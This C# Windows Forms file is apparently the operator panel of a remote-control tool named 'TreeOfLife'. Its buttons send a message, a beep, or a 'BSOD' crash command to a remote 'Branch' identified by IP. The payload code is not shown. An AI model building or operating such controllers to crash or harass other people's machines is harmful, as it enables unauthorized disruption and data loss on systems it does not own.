using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net;
using System.Threading;
using System.Collections;
using System.IO;

namespace TreeOfLife
{
    public partial class BranchManager : Form
    {
        private Branch b;
        private enum cmds
        {
            Message = 1, Beep = 2, BSOD = 3
        }

        public BranchManager(Branch b)
        {
            InitializeComponent();

            this.b = b;
            this.Text = b.IP;
        }

        private void SendMessageBtn_Click(object sender, EventArgs e)
        {
            string message = SendMessageBox.Text;
            if(String.IsNullOrEmpty(message))
            {
                MessageBox.Show("Enter A Message!");
            }else
            {
                //b.SendCommand(1);
                b.SendMessage(message);
                SendMessageBox.Text = "";
            }
        }

        private void BSODBtn_Click(object sender, EventArgs e)
        {
            b.SendCommand(3);
        }

        private void SendBeep_Click(object sender, EventArgs e)
        {
            string Freq = FrequencyBox.Text;
            string Duration = DurationBox.Text;

            try
            {
                int.Parse(Freq);
                int.Parse(Duration);

                if(String.IsNullOrEmpty(Freq) || String.IsNullOrEmpty(Duration))
                {
                    MessageBox.Show("Can't Leave Boxed Blank!");
                }
                else
                {
                    b.SendBeep(Freq, Duration);
                }
            }
            catch (Exception e1) { MessageBox.Show("Improper Format"); FrequencyBox.Text = "";DurationBox.Text = ""; }
        }
    }
}
